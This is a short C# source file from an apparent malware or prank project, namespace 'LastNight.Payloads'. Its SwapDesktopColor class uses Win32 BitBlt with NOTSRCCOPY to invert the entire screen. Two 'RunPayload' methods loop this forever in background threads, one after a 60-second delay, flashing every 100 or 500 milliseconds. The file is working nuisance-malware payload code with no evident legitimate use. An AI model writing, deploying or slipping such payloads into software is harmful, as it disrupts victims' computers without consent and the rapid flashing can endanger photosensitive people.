using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace LastNight.Payloads
{
    public class SwapDesktopColor
    {
        [DllImport("user32.dll")]
        public static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        public static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("gdi32.dll")]
        public static extern bool BitBlt(IntPtr hdc, int x, int y, int cx, int cy, IntPtr hdcSrc, int x1, int y1, uint rop);

        [DllImport("user32.dll")]
        public static extern int GetSystemMetrics(int nIndex);

        public void Swap()
        {
            IntPtr upWnd = GetDesktopWindow();
            IntPtr upHdc = GetDC(upWnd);
            IntPtr desktop = GetDC(IntPtr.Zero);
            int xs = GetSystemMetrics(0); //SM_CXSCREEN
            int ys = GetSystemMetrics(1); //SM_CYSCREEN
            BitBlt(desktop, 0, 0, xs, ys, upHdc, 0, 0, 0x00330008); // NOTSRCCOPY
        }

        public void RunPayload()
        {
            Thread thr = new Thread(new ThreadStart(() =>
            {
                Thread.Sleep(60000);
                while(true)
                {
                    Swap();
                    Thread.Sleep(500);
                }
            }));
            thr.Start();
        }

        public void RunPayload2()
        {
            Thread thr = new Thread(new ThreadStart(() =>
            {
                while (true)
                {
                    Swap();
                    Thread.Sleep(100);
                }
            }));
            thr.Start();
        }
    }
}
